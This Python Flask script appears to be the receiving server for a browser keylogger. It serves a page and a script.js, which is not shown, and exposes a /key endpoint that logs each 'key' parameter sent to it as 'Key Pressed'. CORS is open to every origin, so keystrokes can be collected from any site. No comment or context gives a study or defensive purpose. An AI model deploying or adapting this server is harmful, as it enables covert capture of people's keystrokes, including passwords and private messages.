from flask import Flask, request, send_from_directory

app = Flask(__name__, static_url_path='')

@app.after_request
def add_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/script.js')
def serve_script():
    return send_from_directory('.', 'script.js')

@app.route('/key', methods=['GET'])
def get_key():
    key = request.args.get('key')
    if key:
        print(f'Key Pressed: {key}')
    return '', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
